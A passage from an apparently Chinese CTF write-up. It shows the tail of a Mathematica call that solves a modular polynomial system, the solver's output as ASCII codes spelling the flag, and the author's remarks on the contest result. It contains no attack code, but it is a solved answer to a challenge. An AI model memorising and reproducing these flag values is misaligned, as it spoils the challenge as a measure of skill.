str32 * 9068298061633453450429559033030337013743616 + str33 * 199502557355935975909450298726667414302359552 + str34 * 4389056261830591470007906571986683114651910144 + str35 * 96559237760273012340173944583707028522342023168  == 795034084, str0 * 1 + str1 * 23 + str2 * 529 + str3 * 12167 + str4 * 279841 + str5 * 6436343 + str6 * 148035889 + str7 * 3404825447 + str8 * 78310985281 + str9 * 1801152661463 + str10 * 41426511213649 + str11 * 952809757913927 + str12 * 21914624432020321 + str13 * 504036361936467383 + str14 * 11592836324538749809 + str15 * 266635235464391245607 + str16 * 6132610415680998648961 + str17 * 141050039560662968926103 + str18 * 3244150909895248285300369 + str19 * 74615470927590710561908487 + str20 * 1716155831334586342923895201 + str21 * 39471584120695485887249589623 + str22 * 907846434775996175406740561329 + str23 * 20880467999847912034355032910567 + str24 * 480250763996501976790165756943041 + str25 * 11045767571919545466173812409689943 + str26 * 254052654154149545721997685422868689 + str27 * 5843211045545439551605946764725979847 + str28 * 134393854047545109686936775588697536481 + str29 * 3091058643093537522799545838540043339063 + str30 * 71094348791151363024389554286420996798449 + str31 * 1635170022196481349560959748587682926364327 + str32 * 37608910510519071039902074217516707306379521 + str33 * 865004941741938633917747707002884268046728983 + str34 * 19895113660064588580108197261066338165074766609 + str35 * 457587614181485537342488537004525777796719632007  == 184947163, str0 * 1 + str1 * 24 + str2 * 576 + str3 * 13824 + str4 * 331776 + str5 * 7962624 + str6 * 191102976 + str7 * 4586471424 + str8 * 110075314176 + str9 * 2641807540224 + str10 * 63403380965376 + str11 * 1521681143169024 + str12 * 36520347436056576 + str13 * 876488338465357824 + str14 * 21035720123168587776 + str15 * 504857282956046106624 + str16 * 12116574790945106558976 + str17 * 290797794982682557415424 + str18 * 6979147079584381377970176 + str19 * 167499529910025153071284224 + str20 * 4019988717840603673710821376 + str21 * 96479729228174488169059713024 + str22 * 2315513501476187716057433112576 + str23 * 55572324035428505185378394701824 + str24 * 1333735776850284124449081472843776 + str25 * 32009658644406818986777955348250624 + str26 * 768231807465763655682670928358014976 + str27 * 18437563379178327736384102280592359424 + str28 * 442501521100279865673218454734216626176 + str29 * 10620036506406716776157242913621199028224 + str30 * 254880876153761202627773829926908776677376 + str31 * 6117141027690268863066571918245810640257024 + str32 * 146811384664566452713597726037899455366168576 + str33 * 3523473231949594865126345424909586928788045824 + str34 * 84563357566790276763032290197830086290913099776 + str35 * 2029520581602966642312774964747922070981914394624  == 171452954, str0 * 1 + str1 * 25 + str2 * 625 + str3 * 15625 + str4 * 390625 + str5 * 9765625 + str6 * 244140625 + str7 * 6103515625 + str8 * 152587890625 + str9 * 3814697265625 + str10 * 95367431640625 + str11 * 2384185791015625 + str12 * 59604644775390625 + str13 * 1490116119384765625 + str14 * 37252902984619140625 + str15 * 931322574615478515625 + str16 * 23283064365386962890625 + str17 * 582076609134674072265625 + str18 * 14551915228366851806640625 + str19 * 363797880709171295166015625 + str20 * 9094947017729282379150390625 + str21 * 227373675443232059478759765625 + str22 * 5684341886080801486968994140625 + str23 * 142108547152020037174224853515625 + str24 * 3552713678800500929355621337890625 + str25 * 88817841970012523233890533447265625 + str26 * 2220446049250313080847263336181640625 + str27 * 55511151231257827021181583404541015625 + str28 * 1387778780781445675529539585113525390625 + str29 * 34694469519536141888238489627838134765625 + str30 * 867361737988403547205962240695953369140625 + str31 * 21684043449710088680149056017398834228515625 + str32 * 542101086242752217003726400434970855712890625 + str33 * 13552527156068805425093160010874271392822265625 + str34 * 338813178901720135627329000271856784820556640625 + str35 * 8470329472543003390683225006796419620513916015625  == 272370098, str0 * 1 + str1 * 26 + str2 * 676 + str3 * 17576 + str4 * 456976 + str5 * 11881376 + str6 * 308915776 + str7 * 8031810176 + str8 * 208827064576 + str9 * 5429503678976 + str10 * 141167095653376 + str11 * 3670344486987776 + str12 * 95428956661682176 + str13 * 2481152873203736576 + str14 * 64509974703297150976 + str15 * 1677259342285725925376 + str16 * 43608742899428874059776 + str17 * 1133827315385150725554176 + str18 * 29479510200013918864408576 + str19 * 766467265200361890474622976 + str20 * 19928148895209409152340197376 + str21 * 518131871275444637960845131776 + str22 * 13471428653161560586981973426176 + str23 * 350257144982200575261531309080576 + str24 * 9106685769537214956799814036094976 + str25 * 236773830007967588876795164938469376 + str26 * 6156119580207157310796674288400203776 + str27 * 160059109085386090080713531498405298176 + str28 * 4161536836220038342098551818958537752576 + str29 * 108199957741720996894562347292921981566976 + str30 * 2813198901284745919258621029615971520741376 + str31 * 73143171433403393900724146770015259539275776 + str32 * 1901722457268488241418827816020396748021170176 + str33 * 49444783888980694276889523216530315448550424576 + str34 * 1285564381113498051199127603629788201662311038976 + str35 * 33424673908950949331177317694374493243220087013376  == 484621960, str0 * 1 + str1 * 27 + str2 * 729 + str3 * 19683 + str4 * 531441 + str5 * 14348907 + str6 * 387420489 + str7 * 10460353203 + str8 * 282429536481 + str9 * 7625597484987 + str10 * 205891132094649 + str11 * 5559060566555523 + str12 * 150094635296999121 + str13 * 4052555153018976267 + str14 * 109418989131512359209 + str15 * 2954312706550833698643 + str16 * 79766443076872509863361 + str17 * 2153693963075557766310747 + str18 * 58149737003040059690390169 + str19 * 1570042899082081611640534563 + str20 * 42391158275216203514294433201 + str21 * 1144561273430837494885949696427 + str22 * 30903154382632612361920641803529 + str23 * 834385168331080533771857328695283 + str24 * 22528399544939174411840147874772641 + str25 * 608266787713357709119683992618861307 + str26 * 16423203268260658146231467800709255289 + str27 * 443426488243037769948249630619149892803 + str28 * 11972515182562019788602740026717047105681 + str29 * 323257909929174534292273980721360271853387 + str30 * 8727963568087712425891397479476727340041449 + str31 * 235655016338368235499067731945871638181119123 + str32 * 6362685441135942358474828762538534230890216321 + str33 * 171792506910670443678820376588540424234035840667 + str34 * 4638397686588101979328150167890591454318967698009 + str35 * 125236737537878753441860054533045969266612127846243  == 430570773, str0 * 1 + str1 * 28 + str2 * 784 + str3 * 21952 + str4 * 614656 + str5 * 17210368 + str6 * 481890304 + str7 * 13492928512 + str8 * 377801998336 + str9 * 10578455953408 + str10 * 296196766695424 + str11 * 8293509467471872 + str12 * 232218265089212416 + str13 * 6502111422497947648 + str14 * 182059119829942534144 + str15 * 5097655355238390956032 + str16 * 142734349946674946768896 + str17 * 3996561798506898509529088 + str18 * 111903730358193158266814464 + str19 * 3133304450029408431470804992 + str20 * 87732524600823436081182539776 + str21 * 2456510688823056210273111113728 + str22 * 68782299287045573887647111184384 + str23 * 1925904380037276068854119113162752 + str24 * 53925322641043729927915335168557056 + str25 * 1509909033949224437981629384719597568 + str26 * 42277452950578284263485622772148731904 + str27 * 1183768682616191959377597437620164493312 + str28 * 33145523113253374862572728253364605812736 + str29 * 928074647171094496152036391094208962756608 + str30 * 25986090120790645892257018950637850957185024 + str31 * 727610523382138084983196530617859826801180672 + str32 * 20373094654699866379529502857300075150433058816 + str33 * 570446650331596258626826080004402104212125646848 + str34 * 15972506209284695241551130240123258917939518111744 + str35 * 447230173859971466763431646723451249702306507128832  == 639750081, str0 * 1 + str1 * 29 + str2 * 841 + str3 * 24389 + str4 * 707281 + str5 * 20511149 + str6 * 594823321 + str7 * 17249876309 + str8 * 500246412961 + str9 * 14507145975869 + str10 * 420707233300201 + str11 * 12200509765705829 + str12 * 353814783205469041 + str13 * 10260628712958602189 + str14 * 297558232675799463481 + str15 * 8629188747598184440949 + str16 * 250246473680347348787521 + str17 * 7257147736730073114838109 + str18 * 210457284365172120330305161 + str19 * 6103261246589991489578849669 + str20 * 176994576151109753197786640401 + str21 * 5132842708382182842735812571629 + str22 * 148852438543083302439338564577241 + str23 * 4316720717749415770740818372739989 + str24 * 125184900814733057351483732809459681 + str25 * 3630362123627258663193028251474330749 + str26 * 105280501585190501232597819292755591721 + str27 * 3053134545970524535745336759489912159909 + str28 * 88540901833145211536614766025207452637361 + str29 * 2567686153161211134561828214731016126483469 + str30 * 74462898441675122902293018227199467668020601 + str31 * 2159424054808578564166497528588784562372597429 + str32 * 62623297589448778360828428329074752308805325441 + str33 * 1816075630094014572464024421543167816955354437789 + str34 * 52666193272726422601456708224751866691705278695881 + str35 * 1527319604909066255442244538517804134059453082180549  == 695262892, str0 * 1 + str1 * 30 + str2 * 900 + str3 * 27000 + str4 * 810000 + str5 * 24300000 + str6 * 729000000 + str7 * 21870000000 + str8 * 656100000000 + str9 * 19683000000000 + str10 * 590490000000000 + str11 * 17714700000000000 + str12 * 531441000000000000 + str13 * 15943230000000000000 + str14 * 478296900000000000000 + str15 * 14348907000000000000000 + str16 * 430467210000000000000000 + str17 * 12914016300000000000000000 + str18 * 387420489000000000000000000 + str19 * 11622614670000000000000000000 + str20 * 348678440100000000000000000000 + str21 * 10460353203000000000000000000000 + str22 * 313810596090000000000000000000000 + str23 * 9414317882700000000000000000000000 + str24 * 282429536481000000000000000000000000 + str25 * 8472886094430000000000000000000000000 + str26 * 254186582832900000000000000000000000000 + str27 * 7625597484987000000000000000000000000000 + str28 * 228767924549610000000000000000000000000000 + str29 * 6863037736488300000000000000000000000000000 + str30 * 205891132094649000000000000000000000000000000 + str31 * 6176733962839470000000000000000000000000000000 + str32 * 185302018885184100000000000000000000000000000000 + str33 * 5559060566555523000000000000000000000000000000000 + str34 * 166771816996665690000000000000000000000000000000000 + str35 * 5003154509899970700000000000000000000000000000000000  == 144991146, str0 * 1 + str1 * 31 + str2 * 961 + str3 * 29791 + str4 * 923521 + str5 * 28629151 + str6 * 887503681 + str7 * 27512614111 + str8 * 852891037441 + str9 * 26439622160671 + str10 * 819628286980801 + str11 * 25408476896404831 + str12 * 787662783788549761 + str13 * 24417546297445042591 + str14 * 756943935220796320321 + str15 * 23465261991844685929951 + str16 * 727423121747185263828481 + str17 * 22550116774162743178682911 + str18 * 699053619999045038539170241 + str19 * 21670662219970396194714277471 + str20 * 671790528819082282036142601601 + str21 * 20825506393391550743120420649631 + str22 * 645590698195138073036733040138561 + str23 * 20013311644049280264138724244295391 + str24 * 620412660965527688188300451573157121 + str25 * 19232792489931358333837313998767870751 + str26 * 596216567187872108348956733961803993281 + str27 * 18482713582824035358817658752815923791711 + str28 * 572964121067545096123347421337293637543041 + str29 * 17761887753093897979823770061456102763834271 + str30 * 550618520345910837374536871905139185678862401 + str31 * 17069174130723235958610643029059314756044734431 + str32 * 529144398052420314716929933900838757437386767361 + str33 * 16403476339625029756224827950926001480558989788191 + str34 * 508507766528375922442969666478706045897328683433921 + str35 * 15763740762379653595732059660839887422817189186451551  == 292318513, str0 * 1 + str1 * 32 + str2 * 1024 + str3 * 32768 + str4 * 1048576 + str5 * 33554432 + str6 * 1073741824 + str7 * 34359738368 + str8 * 1099511627776 + str9 * 35184372088832 + str10 * 1125899906842624 + str11 * 36028797018963968 + str12 * 1152921504606846976 + str13 * 36893488147419103232 + str14 * 1180591620717411303424 + str15 * 37778931862957161709568 + str16 * 1208925819614629174706176 + str17 * 38685626227668133590597632 + str18 * 1237940039285380274899124224 + str19 * 39614081257132168796771975168 + str20 * 1267650600228229401496703205376 + str21 * 40564819207303340847894502572032 + str22 * 1298074214633706907132624082305024 + str23 * 41538374868278621028243970633760768 + str24 * 1329227995784915872903807060280344576 + str25 * 42535295865117307932921825928971026432 + str26 * 1361129467683753853853498429727072845824 + str27 * 43556142965880123323311949751266331066368 + str28 * 1393796574908163946345982392040522594123776 + str29 * 44601490397061246283071436545296723011960832 + str30 * 1427247692705959881058285969449495136382746624 + str31 * 45671926166590716193865151022383844364247891968 + str32 * 1461501637330902918203684832716283019655932542976 + str33 * 46768052394588893382517914646921056628989841375232 + str34 * 1496577676626844588240573268701473812127674924007424 + str35 * 47890485652059026823698344598447161988085597568237568  == 573477240, str0 * 1 + str1 * 33 + str2 * 1089 + str3 * 35937 + str4 * 1185921 + str5 * 39135393 + str6 * 1291467969 + str7 * 42618442977 + str8 * 1406408618241 + str9 * 46411484401953 + str10 * 1531578985264449 + str11 * 50542106513726817 + str12 * 1667889514952984961 + str13 * 55040353993448503713 + str14 * 1816331681783800622529 + str15 * 59938945498865420543457 + str16 * 1977985201462558877934081 + str17 * 65273511648264442971824673 + str18 * 2154025884392726618070214209 + str19 * 71082854184959978396317068897 + str20 * 2345734188103679287078463273601 + str21 * 77409228207421416473589288028833 + str22 * 2554504530844906743628446504951489 + str23 * 84298649517881922539738734663399137 + str24 * 2781855434090103443811378243892171521 + str25 * 91801229324973413645775482048441660193 + str26 * 3029440567724122650310590907598574786369 + str27 * 99971538734896047460249499950752967950177 + str28 * 3299060778251569566188233498374847942355841 + str29 * 108869005682301795684211705446369982097742753 + str30 * 3592677187515959257578986279730209409225510849 + str31 * 118558347188026655500106547231096910504441858017 + str32 * 3912425457204879631503516058626198046646581314561 + str33 * 129110040087761027839616029934664535539337183380513 + str34 * 4260631322896113918707328987843929672798127051556929 + str35 * 140600833655571759317341856598849679202338192701378657  == 867813853, str0 * 1 + str1 * 34 + str2 * 1156 + str3 * 39304 + str4 * 1336336 + str5 * 45435424 + str6 * 1544804416 + str7 * 52523350144 + str8 * 1785793904896 + str9 * 60716992766464 + str10 * 2064377754059776 + str11 * 70188843638032384 + str12 * 2386420683693101056 + str13 * 81138303245565435904 + str14 * 2758702310349224820736 + str15 * 93795878551873643905024 + str16 * 3189059870763703892770816 + str17 * 108428035605965932354207744 + str18 * 3686553210602841700043063296 + str19 * 125342809160496617801464152064 + str20 * 4261655511456885005249781170176 + str21 * 144896287389534090178492559785984 + str22 * 4926473771244159066068747032723456 + str23 * 167500108222301408246337399112597504 + str24 * 5695003679558247880375471569828315136 + str25 * 193630125104980427932766033374162714624 + str26 * 6583424253569334549714045134721532297216 + str27 * 223836424621357374690277534580532098105344 + str28 * 7610438437126150739469436175738091335581696 + str29 * 258754906862289125141960829975095105409777664 + str30 * 8797666833317830254826668219153233583932440576 + str31 * 299120672332806228664106719451209941853702979584 + str32 * 10170102859315411774579628461341138023025901305856 + str33 * 345783497216724000335707367685598692782880644399104 + str34 * 11756638905368616011414050501310355554617941909569536 + str35 * 399725722782532944388077717044552088857010024925364224  == 798543925, str0 * 1 + str1 * 35 + str2 * 1225 + str3 * 42875 + str4 * 1500625 + str5 * 52521875 + str6 * 1838265625 + str7 * 64339296875 + str8 * 2251875390625 + str9 * 78815638671875 + str10 * 2758547353515625 + str11 * 96549157373046875 + str12 * 3379220508056640625 + str13 * 118272717781982421875 + str14 * 4139545122369384765625 + str15 * 144884079282928466796875 + str16 * 5070942774902496337890625 + str17 * 177482997121587371826171875 + str18 * 6211904899255558013916015625 + str19 * 217416671473944530487060546875 + str20 * 7609583501588058567047119140625 + str21 * 266335422555582049846649169921875 + str22 * 9321739789445371744632720947265625 + str23 * 326260892630588011062145233154296875 + str24 * 11419131242070580387175083160400390625 + str25 * 399669593472470313551127910614013671875 + str26 * 13988435771536460974289476871490478515625 + str27 * 489595252003776134100131690502166748046875 + str28 * 17135833820132164693504609167575836181640625 + str29 * 599754183704625764272661320865154266357421875 + str30 * 20991396429661901749543146230280399322509765625 + str31 * 734698875038166561234010118059813976287841796875 + str32 * 25714460626335829643190354132093489170074462890625 + str33 * 900006121921754037511662394623272120952606201171875 + str34 * 31500214267261391312908183811814524233341217041015625 + str35 * 1102507499354148695951786433413508348166942596435546875  == 12064634, str0 * 1 + str1 * 36 + str2 * 1296 + str3 * 46656 + str4 * 1679616 + str5 * 60466176 + str6 * 2176782336 + str7 * 78364164096 + str8 * 2821109907456 + str9 * 101559956668416 + str10 * 3656158440062976 + str11 * 131621703842267136 + str12 * 4738381338321616896 + str13 * 170581728179578208256 + str14 * 6140942214464815497216 + str15 * 221073919720733357899776 + str16 * 7958661109946400884391936 + str17 * 286511799958070431838109696 + str18 * 10314424798490535546171949056 + str19 * 371319292745659279662190166016 + str20 * 13367494538843734067838845976576 + str21 * 481229803398374426442198455156736 + str22 * 17324272922341479351919144385642496 + str23 * 623673825204293256669089197883129856 + str24 * 22452257707354557240087211123792674816 + str25 * 808281277464764060643139600456536293376 + str26 * 29098125988731506183153025616435306561536 + str27 * 1047532535594334222593508922191671036215296 + str28 * 37711171281396032013366321198900157303750656 + str29 * 1357602166130257152481187563160405662935023616 + str30 * 48873677980689257489322752273774603865660850176 + str31 * 1759452407304813269615619081855885739163790606336 + str32 * 63340286662973277706162286946811886609896461828096 + str33 * 2280250319867037997421842330085227917956272625811456 + str34 * 82089011515213367907186323883068205046425814529212416 + str35 * 2955204414547681244658707659790455381671329323051646976  == 874910184}, {str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21, str22, str23, str24, str25, str26, str27, str28, str29, str30, str31, str32, str33, str34, str35}, Modulus -> 998244353]
```
啪的一下，很快啊，MMA 立马给我输出了结果：
```
{{str35->125,str34->101,str33->71,str32->110,str31->52,str30->82,str29->103,str28->64,str27->108,str26->95,str25->102,str24->111,str23->95,str22->114,str21->51,str20->84,str19->36,str18->65,str17->109,str16->95,str15->69,str14->72,str13->84,str12->95,str11->101,str10->114,str9->65,str8->95,str7->85,str6->111,str5->121,str4->123,str3->103,str2->97,str1->108,str0->102}}
```
最终我在比赛快要结束的那一刹那满意交上了 Flag 1！
可惜最终以 25 名不幸垫底。
顺带一提，它不是出的十进制数据吗？我急着把它转成十六进制丢去解码，所以打开了 Excel。
「有人做 CTF 用 Excel，我不说是谁——」
